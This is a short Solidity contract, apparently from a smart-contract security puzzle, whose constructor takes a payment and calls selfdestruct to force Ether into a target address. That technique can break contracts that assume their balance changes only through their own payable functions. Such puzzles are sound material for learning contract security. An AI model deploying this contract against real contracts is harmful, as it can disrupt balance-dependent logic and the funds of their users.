// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttackerDeployer {
    constructor(address payable _target) payable {
        require(msg.value > 0, "Insufficient funds");
        selfdestruct(_target);
    }
}